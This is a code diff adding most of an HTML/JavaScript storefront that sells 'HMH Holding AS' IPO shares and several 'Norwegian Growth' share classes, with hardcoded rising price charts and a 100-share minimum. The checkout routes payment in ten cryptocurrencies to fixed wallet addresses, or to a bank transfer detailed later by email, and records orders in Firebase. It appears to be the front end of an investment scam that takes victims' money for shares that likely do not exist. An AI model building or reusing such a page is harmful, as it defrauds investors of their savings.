@@ -252,4 +252,393 @@
 
       <!-- BANK BOX -->
       <div id="bankBox" style="display:none;">
-        <div style="background:rgba(201,168,76,0.08);border:1px solid rgba(201,168,76,0.2);border-radius:4px;padding:1.25rem;margin-bottom:1.25rem;
+        <div style="background:rgba(201,168,76,0.08);border:1px solid rgba(201,168,76,0.2);border-radius:4px;padding:1.25rem;margin-bottom:1.25rem;font-size:0.875rem;line-height:1.8;color:rgba(255,255,255,0.7);">
+          <div style="font-weight:700;color:var(--gold);margin-bottom:0.5rem;">🏦 Bank Transfer Instructions</div>
+          After confirming, we will send bank details to your registered email within a few hours. Allow 2–3 business days for the payment to clear and your shares to be allocated.
+        </div>
+        <div class="alert" id="bankAlert"></div>
+        <div style="display:flex;gap:0.75rem;">
+          <button class="btn btn-outline" style="flex:1;" onclick="goStep(2)">← Back</button>
+          <button class="btn btn-gold" style="flex:2;" id="bankConfirmBtn" onclick="confirmBank()">Confirm Bank Order</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- SUCCESS NOTIFICATION POPUP -->
+<div id="successPopup" style="display:none;position:fixed;bottom:2rem;right:2rem;background:var(--card);border:1px solid rgba(76,175,130,0.4);border-radius:6px;padding:1.25rem 1.5rem;max-width:340px;z-index:999;animation:fadeUp 0.4s ease both;box-shadow:0 8px 32px rgba(0,0,0,0.4);">
+  <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.5rem;">
+    <div style="width:36px;height:36px;background:rgba(76,175,130,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0;">✓</div>
+    <div style="font-weight:700;font-size:0.95rem;color:var(--success);" id="popupTitle">Order Confirmed!</div>
+  </div>
+  <div style="font-size:0.82rem;color:rgba(255,255,255,0.6);line-height:1.6;" id="popupMsg"></div>
+  <button onclick="document.getElementById('successPopup').style.display='none'" style="margin-top:0.75rem;background:transparent;border:none;color:rgba(255,255,255,0.3);font-size:0.75rem;cursor:pointer;">Dismiss</button>
+</div>
+
+<style>
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+</style>
+
+<script>
+// ── HIDE LOADING SCREEN ALWAYS WITHIN 2s ──────────────────
+(function() {
+  var maxWait = setTimeout(function() {
+    var ls = document.getElementById('loadingScreen');
+    if (ls) ls.style.display = 'none';
+  }, 2000);
+  window._clearLoadingTimeout = function() { clearTimeout(maxWait); };
+})();
+
+var _user = null;
+var selectedShare = null;
+var currentFilter = 'all';
+var selectedPay = 'crypto';
+var selectedCoin = null;
+var cryptoRates = {};
+
+// ── SHARES DATA ────────────────────────────────────────────
+var shares = [
+  {code:'HMH',   name:'HMH Holding AS',    sector:'Energy / Oil Equipment', desc:"Norway's leading oil drilling equipment company. Co-owned by Baker Hughes and Akastor. IPO price NOK 190–210. 2025 revenue: NOK 821.8M.",  price:200.00, change:5.2,  rising:true,  tag:'ipo', volume:'10,500,000', cap:'NOK 948.1M', history:[160,165,170,168,175,180,178,185,190,188,195,200]},
+  {code:'NOR-A', name:'Norwegian Growth A', sector:'Diversified Growth',   desc:'Flagship share class for long-term investors seeking steady growth.',                                                                           price:245.00, change:2.4,  rising:true,  tag:'',    volume:'12,430',      cap:'NOK 980K',   history:[210,215,218,222,220,225,228,230,235,238,242,245]},
+  {code:'NOR-B', name:'Norwegian Growth B', sector:'Diversified Growth',   desc:'Mid-tier share class at a lower entry price. Great for diversifying.',                                                                          price:180.50, change:0.8,  rising:false, tag:'',    volume:'8,210',       cap:'NOK 722K',   history:[188,186,185,187,184,183,185,183,182,181,182,180]},
+  {code:'NOR-C', name:'Norwegian Growth C', sector:'Diversified Growth',   desc:'Premium share class suited for larger single investments.',                                                                                     price:310.00, change:1.2,  rising:true,  tag:'',    volume:'5,100',       cap:'NOK 310K',   history:[290,292,295,293,298,300,302,304,306,307,309,310]},
+  {code:'NOR-D', name:'Norwegian Growth D', sector:'Entry Level',          desc:'Entry-level share class. Minimum 100 shares per purchase.',                                                                                    price:95.75,  change:3.1,  rising:true,  tag:'',    volume:'22,800',      cap:'NOK 218K',   history:[82,83,84,85,86,87,88,89,90,92,94,95]},
+  {code:'NOR-E', name:'Norwegian Growth E', sector:'Premium Class',        desc:'Exclusive high-value share class. Limited availability.',                                                                                      price:420.00, change:0.3,  rising:false, tag:'',    volume:'1,800',       cap:'NOK 168K',   history:[425,424,423,422,421,422,421,420,421,420,421,420]}
+];
+
+// ── CRYPTO COINS & WALLETS ─────────────────────────────────
+var coins = [
+  {code:'ETH',   name:'Ethereum',  icon:'🔷', cgId:'ethereum',        addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'BTC',   name:'Bitcoin',   icon:'🟠', cgId:'bitcoin',         addr:'bc1q5xemr8w6x5dhvqpcffh677ww8cjmf47et34trm'},
+  {code:'SOL',   name:'Solana',    icon:'🟣', cgId:'solana',          addr:'DjUY1dBxbJU6TsPkQgUo1oAYzBrTHgSoCueiCPKfPi9F'},
+  {code:'USDT',  name:'USDT',      icon:'💚', cgId:'tether',          addr:'TYPE7cyogP2fdKbUHaHwgxBDTGBdvvprCN'},
+  {code:'BNB',   name:'BNB',       icon:'🟡', cgId:'binancecoin',     addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'MATIC', name:'Polygon',   icon:'🟪', cgId:'matic-network',   addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'ARB',   name:'Arbitrum',  icon:'🔵', cgId:'arbitrum',        addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'AVAX',  name:'Avalanche', icon:'🔺', cgId:'avalanche-2',     addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'OP',    name:'Optimism',  icon:'🔴', cgId:'optimism',        addr:'0xCe050bA8d1246a02d74D920B31E69aa00b8f9Bee'},
+  {code:'TRX',   name:'Tron',      icon:'🔴', cgId:'tron',            addr:'TYPE7cyogP2fdKbUHaHwgxBDTGBdvvprCN'}
+];
+
+// ── FETCH LIVE CRYPTO RATES ────────────────────────────────
+function fetchRates() {
+  var ids = coins.map(function(c){return c.cgId;}).join(',');
+  fetch('https://api.coingecko.com/api/v3/simple/price?ids='+ids+'&vs_currencies=nok')
+    .then(function(r){return r.json();})
+    .then(function(data){
+      coins.forEach(function(c){
+        if(data[c.cgId] && data[c.cgId].nok) cryptoRates[c.code] = data[c.cgId].nok;
+      });
+      // Fallback rates if API fails
+      if(!cryptoRates.ETH) setFallbackRates();
+      updateConversion();
+    }).catch(function(){ setFallbackRates(); updateConversion(); });
+}
+
+function setFallbackRates() {
+  // Approximate NOK rates (fallback only)
+  cryptoRates = {ETH:35000,BTC:1000000,SOL:2000,USDT:11,BNB:7000,MATIC:12,ARB:18,AVAX:400,OP:25,TRX:2.5};
+}
+
+// ── DRAW MINI CHART ────────────────────────────────────────
+function drawChart(canvas, data, rising) {
+  if (!canvas) return;
+  var ctx = canvas.getContext('2d');
+  var w = canvas.offsetWidth || 300; canvas.width = w;
+  var h = canvas.height;
+  var min = Math.min.apply(null,data)-2, max = Math.max.apply(null,data)+2;
+  var sx = w/(data.length-1);
+  var color = rising ? '#4caf82' : '#e05555';
+  ctx.clearRect(0,0,w,h);
+  var g = ctx.createLinearGradient(0,0,0,h);
+  g.addColorStop(0, rising?'rgba(76,175,130,0.3)':'rgba(224,85,85,0.3)');
+  g.addColorStop(1,'rgba(0,0,0,0)');
+  ctx.beginPath();
+  for(var i=0;i<data.length;i++){var x=i*sx,y=h-((data[i]-min)/(max-min))*h;i?ctx.lineTo(x,y):ctx.moveTo(x,y);}
+  ctx.lineTo(w,h);ctx.lineTo(0,h);ctx.closePath();ctx.fillStyle=g;ctx.fill();
+  ctx.beginPath();
+  for(var j=0;j<data.length;j++){var x2=j*sx,y2=h-((data[j]-min)/(max-min))*h;j?ctx.lineTo(x2,y2):ctx.moveTo(x2,y2);}
+  ctx.strokeStyle=color;ctx.lineWidth=2;ctx.stroke();
+}
+
+// ── RENDER SHARE CARDS ─────────────────────────────────────
+function renderGrid() {
+  var q = document.getElementById('searchInput').value.toLowerCase();
+  var list = shares.filter(function(s){
+    if(currentFilter==='ipo') return s.tag==='ipo';
+    if(currentFilter==='rising') return s.rising;
+    if(currentFilter==='falling') return !s.rising;
+    return true;
+  });
+  if(q) list=list.filter(function(s){return s.name.toLowerCase().indexOf(q)>-1||s.code.toLowerCase().indexOf(q)>-1;});
+  var grid = document.getElementById('sharesGrid');
+  if(!list.length){grid.innerHTML='<div style="grid-column:1/-1;text-align:center;padding:3rem;color:rgba(255,255,255,0.4);">No shares found.</div>';return;}
+  var html='';
+  for(var i=0;i<list.length;i++){
+    var s=list[i];
+    var minTotal=(s.price*100).toFixed(2);
+    html+='<div class="share-card">'+
+      '<div style="display:flex;justify-content:space-between;margin-bottom:0.75rem;">'+
+        '<span class="badge badge-gold">'+s.code+(s.tag==='ipo'?' 🔥':'')+'</span>'+
+        '<span class="badge '+(s.rising?'badge-green':'badge-red')+'">'+(s.rising?'▲ +':'▼ ')+Math.abs(s.change)+'%</span>'+
+      '</div>'+
+      '<div style="font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:rgba(255,255,255,0.35);margin-bottom:0.25rem;">'+s.sector+'</div>'+
+      '<div style="font-family:\'Playfair Display\',serif;font-size:1rem;font-weight:700;margin-bottom:0.35rem;">'+s.name+'</div>'+
+      '<div style="font-size:0.78rem;color:rgba(255,255,255,0.45);line-height:1.5;margin-bottom:0.85rem;">'+s.desc+'</div>'+
+      '<canvas id="c-'+s.code+'" height="50" style="width:100%;display:block;margin-bottom:0.85rem;"></canvas>'+
+      '<div style="font-size:0.65rem;text-transform:uppercase;letter-spacing:0.1em;color:rgba(255,255,255,0.35);margin-bottom:0.2rem;">Price per share</div>'+
+      '<div style="font-family:\'Playfair Display\',serif;font-size:1.4rem;color:var(--gold);margin-bottom:0.4rem;">NOK '+s.price.toFixed(2)+'</div>'+
+      '<div style="font-size:0.72rem;color:rgba(201,168,76,0.7);margin-bottom:0.75rem;">Min. 100 shares = NOK '+minTotal+'</div>'+
+      '<div style="display:flex;gap:0.5rem;margin-bottom:0;flex-wrap:wrap;">'+
+        '<div style="font-size:0.68rem;color:rgba(255,255,255,0.35);">Vol: '+s.volume+'</div>'+
+        '<div style="font-size:0.68rem;color:rgba(255,255,255,0.35);">Cap: '+s.cap+'</div>'+
+      '</div>'+
+      '<button class="btn btn-gold btn-block" style="margin-top:0.85rem;" onclick="openModal(\''+s.code+'\')">Buy '+s.code+' — Min 100 Shares</button>'+
+    '</div>';
+  }
+  grid.innerHTML=html;
+  setTimeout(function(){
+    for(var k=0;k<list.length;k++){var c=document.getElementById('c-'+list[k].code);if(c)drawChart(c,list[k].history,list[k].rising);}
+    var hc=document.getElementById('hmhChart');if(hc)drawChart(hc,shares[0].history,true);
+  },80);
+}
+
+// ── MODAL OPEN ─────────────────────────────────────────────
+window.openModal = function(code) {
+  if(!_user){window.location.href='login.html';return;}
+  selectedShare=null;
+  for(var i=0;i<shares.length;i++){if(shares[i].code===code){selectedShare=shares[i];break;}}
+  if(!selectedShare)return;
+  goStep(1);
+  document.getElementById('mTitle').textContent='Buy '+selectedShare.code+' Shares';
+  document.getElementById('mSub').textContent=selectedShare.name+' · '+selectedShare.sector;
+  document.getElementById('mPrice').textContent='NOK '+selectedShare.price.toFixed(2);
+  var chg=document.getElementById('mChange');
+  chg.textContent=(selectedShare.rising?'▲ +':'▼ ')+Math.abs(selectedShare.change)+'%';
+  chg.style.color=selectedShare.rising?'#4caf82':'#e05555';
+  document.getElementById('qtyInput').value=100;
+  document.getElementById('qtyErr').classList.remove('show');
+  updateTotal();
+  document.getElementById('modalOverlay').classList.add('show');
+  setTimeout(function(){var mc=document.getElementById('mChart');if(mc)drawChart(mc,selectedShare.history,selectedShare.rising);},60);
+};
+
+// ── QUANTITY UPDATE ────────────────────────────────────────
+window.updateTotal = function() {
+  if(!selectedShare)return;
+  var q=Math.max(100,parseInt(document.getElementById('qtyInput').value)||100);
+  document.getElementById('qtyInput').value=q;
+  document.getElementById('mTotal').textContent='NOK '+(selectedShare.price*q).toFixed(2);
+};
+
+window.changeQty = function(d) {
+  var i=document.getElementById('qtyInput');
+  i.value=Math.max(100,(parseInt(i.value)||100)+d);
+  updateTotal();
+};
+
+// ── STEP NAVIGATION ────────────────────────────────────────
+function goStep(n) {
+  for(var i=1;i<=3;i++){
+    document.getElementById('s'+i).style.display=i===n?'block':'none';
+    document.getElementById('d'+i).className='sdot '+(i<=n?'on':'off');
+    document.getElementById('l'+i).className='slabel '+(i<=n?'on':'off');
+  }
+}
+window.goStep=goStep;
+
+window.toStep2 = function() {
+  if(!_user){window.location.href='login.html';return;}
+  var q=parseInt(document.getElementById('qtyInput').value)||0;
+  if(q<100){document.getElementById('qtyErr').classList.add('show');return;}
+  document.getElementById('qtyErr').classList.remove('show');
+  var total=(selectedShare.price*q).toFixed(2);
+  document.getElementById('r1').textContent=selectedShare.code+' — '+selectedShare.name;
+  document.getElementById('r2').textContent=q+' shares';
+  document.getElementById('r3').textContent='NOK '+total;
+  goStep(2);
+};
+
+window.toStep3 = function() {
+  var q=parseInt(document.getElementById('qtyInput').value)||100;
+  var total=(selectedShare.price*q).toFixed(2);
+  document.getElementById('s3Title').textContent=selectedPay==='crypto'?'Crypto Payment':'Bank Transfer';
+  document.getElementById('cryptoBox').style.display=selectedPay==='crypto'?'block':'none';
+  document.getElementById('bankBox').style.display=selectedPay==='bank'?'block':'none';
+  document.getElementById('nokTotal').textContent='NOK '+total;
+  document.getElementById('s3Alert').className='alert';
+  document.getElementById('bankAlert').className='alert';
+
+  if(selectedPay==='crypto'){
+    buildCoinSelector(parseFloat(total));
+    fetchRates();
+  }
+  goStep(3);
+};
+
+// ── BUILD COIN SELECTOR BUTTONS ────────────────────────────
+function buildCoinSelector(nokTotal) {
+  var html='';
+  for(var i=0;i<coins.length;i++){
+    var c=coins[i];
+    html+='<button onclick="selectCoin(\''+c.code+'\')" id="cb-'+c.code+'" style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:3px;padding:0.4rem;cursor:pointer;font-size:1.1rem;text-align:center;transition:all 0.2s;" title="'+c.name+'">'+c.icon+'<div style="font-size:0.6rem;color:rgba(255,255,255,0.5);margin-top:0.2rem;">'+c.code+'</div></button>';
+  }
+  document.getElementById('coinSelector').innerHTML=html;
+  selectedCoin=null;
+}
+
+window.selectCoin = function(code) {
+  selectedCoin=null;
+  for(var i=0;i<coins.length;i++){if(coins[i].code===code){selectedCoin=coins[i];break;}}
+  // Highlight selected
+  coins.forEach(function(c){
+    var btn=document.getElementById('cb-'+c.code);
+    if(btn)btn.style.borderColor=c.code===code?'var(--gold)':'rgba(255,255,255,0.1)';
+  });
+  updateConversion();
+};
+
+function updateConversion() {
+  if(!selectedCoin||!selectedShare)return;
+  var q=parseInt(document.getElementById('qtyInput').value)||100;
+  var nokAmount=selectedShare.price*q;
+  var rate=cryptoRates[selectedCoin.code];
+  if(!rate){document.getElementById('cryptoAmount').textContent='Loading...';return;}
+  var cryptoAmt=(nokAmount/rate).toFixed(selectedCoin.code==='BTC'?8:selectedCoin.code==='ETH'?6:2);
+  document.getElementById('cryptoAmount').textContent=cryptoAmt+' '+selectedCoin.code;
+  document.getElementById('cryptoCoin').textContent='Send '+selectedCoin.name+' ('+selectedCoin.code+') to our wallet';
+  document.getElementById('rateNote').textContent='Rate: 1 '+selectedCoin.code+' ≈ NOK '+rate.toLocaleString()+' (live)';
+  document.getElementById('nokTotal').textContent='NOK '+nokAmount.toFixed(2);
+}
+
+// ── PAY SELECTION ──────────────────────────────────────────
+window.pickPay = function(method, el) {
+  selectedPay=method;
+  document.querySelectorAll('.pay-option').forEach(function(e){e.classList.remove('active');});
+  el.classList.add('active');
+  el.querySelector('input').checked=true;
+};
+
+// ── CONFIRM & PAY (CRYPTO) ─────────────────────────────────
+window.confirmAndPay = function() {
+  if(!_user){window.location.href='login.html';return;}
+  if(!selectedCoin){
+    document.getElementById('s3Alert').textContent='⚠ Please select a cryptocurrency first.';
+    document.getElementById('s3Alert').className='alert show error';return;
+  }
+  var q=parseInt(document.getElementById('qtyInput').value)||100;
+  var nokTotal=selectedShare.price*q;
+  var rate=cryptoRates[selectedCoin.code]||1;
+  var cryptoAmt=(nokTotal/rate).toFixed(selectedCoin.code==='BTC'?8:selectedCoin.code==='ETH'?6:2);
+  var btn=document.getElementById('confirmBtn');
+  btn.textContent='Saving...';btn.disabled=true;
+
+  if(window.saveOrder){
+    window.saveOrder(_user.uid,_user.email,selectedShare,q,nokTotal,selectedCoin.code,cryptoAmt,selectedCoin.addr)
+    .then(function(){
+      btn.textContent='Confirm & Pay with Crypto';btn.disabled=false;
+      closeModal();
+      showPopup(
+        '🎉 Order Confirmed!',
+        q+' × '+selectedShare.code+' for NOK '+nokTotal.toFixed(2)+'\n\nSend exactly '+cryptoAmt+' '+selectedCoin.code+' to:\n'+selectedCoin.addr.substring(0,20)+'...\n\nThen go to the Payment page to submit your transaction hash.'
+      );
+      // Redirect to payment page with full details
+      setTimeout(function(){
+        window.location.href='payment.html?share='+selectedShare.code+'&qty='+q+'&total='+nokTotal.toFixed(2)+'&coin='+selectedCoin.code+'&amount='+cryptoAmt;
+      },3000);
+    }).catch(function(){
+      btn.textContent='Confirm & Pay with Crypto';btn.disabled=false;
+      document.getElementById('s3Alert').textContent='⚠ Error saving order. Please try again.';
+      document.getElementById('s3Alert').className='alert show error';
+    });
+  } else {
+    btn.textContent='Confirm & Pay with Crypto';btn.disabled=false;
+    closeModal();
+    showPopup('🎉 Order Saved!', q+' × '+selectedShare.code+' — Send '+cryptoAmt+' '+selectedCoin.code);
+    setTimeout(function(){
+      window.location.href='payment.html?share='+selectedShare.code+'&qty='+q+'&total='+nokTotal.toFixed(2)+'&coin='+selectedCoin.code+'&amount='+cryptoAmt;
+    },2000);
+  }
+};
+
+// ── CONFIRM BANK ───────────────────────────────────────────
+window.confirmBank = function() {
+  if(!_user){window.location.href='login.html';return;}
+  var q=parseInt(document.getElementById('qtyInput').value)||100;
+  var total=selectedShare.price*q;
+  var btn=document.getElementById('bankConfirmBtn');
+  btn.textContent='Saving...';btn.disabled=true;
+  if(window.saveOrder){
+    window.saveOrder(_user.uid,_user.email,selectedShare,q,total,'bank','','')
+    .then(function(){
+      btn.textContent='Confirm Bank Order';btn.disabled=false;
+      closeModal();
+      showPopup('✓ Bank Order Confirmed!','Your order for '+q+' × '+selectedShare.code+' (NOK '+total.toFixed(2)+') has been saved. Bank transfer details will be sent to your email.');
+    }).catch(function(){
+      btn.textContent='Confirm Bank Order';btn.disabled=false;
+      document.getElementById('bankAlert').textContent='⚠ Error. Please try again.';
+      document.getElementById('bankAlert').className='alert show error';
+    });
+  }
+};
+
+// ── POPUP NOTIFICATION ─────────────────────────────────────
+function showPopup(title, msg) {
+  document.getElementById('popupTitle').textContent=title;
+  document.getElementById('popupMsg').textContent=msg;
+  var p=document.getElementById('successPopup');
+  p.style.display='block';
+  setTimeout(function(){p.style.display='none';},8000);
+}
+
+// ── UTILS ──────────────────────────────────────────────────
+window.closeModal = function(){document.getElementById('modalOverlay').classList.remove('show');};
+window.closeOutside = function(e){if(e.target===document.getElementById('modalOverlay'))closeModal();};
+window.setFilter = function(f,btn){currentFilter=f;document.querySelectorAll('.filter-btn').forEach(function(b){b.classList.remove('active');});btn.classList.add('active');renderGrid();};
+window.toggleMenu = function(){var m=document.getElementById('mobileMenu');var h=document.getElementById('hamburger');m.classList.toggle('open');if(h)h.classList.toggle('open');};
+
+// ── INIT — runs immediately, no waiting for Firebase ───────
+renderGrid();
+setFallbackRates();
+fetchRates();
+</script>
+
+<!-- FIREBASE — loads async, does NOT block page render -->
+<script type="module">
+import { auth, db } from './js/firebase.js';
+import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+// Hide loading screen as soon as Firebase responds
+onAuthStateChanged(auth, function(user) {
+  var ls = document.getElementById('loadingScreen');
+  if(ls) ls.style.display='none';
+  if(window._clearLoadingTimeout) window._clearLoadingTimeout();
+  window._user = user;
+  var btn = document.getElementById('navAuthBtn');
+  if(btn && user){ btn.textContent='My Dashboard'; btn.href='dashboard.html'; }
+});
+
+window.saveOrder = function(uid, email, share, qty, total, payMethod, cryptoAmt, cryptoAddr) {
+  return addDoc(collection(db,'transactions'), {
+    userId: uid,
+    userEmail: email,
+    shareCode: share.code,
+    shareName: share.name,
+    quantity: qty,
+    pricePerShare: share.price,
+    totalAmountNOK: total,
+    paymentMethod: payMethod,
+    cryptoAmount: cryptoAmt||'',
+    cryptoAddress: cryptoAddr||'',
+    status: payMethod==='bank'?'awaiting_bank_transfer':'awaiting_crypto_payment',
+    type: 'buy',
+    timestamp: serverTimestamp()
+  });
+};
+</script>
+
+</body>
+</html>
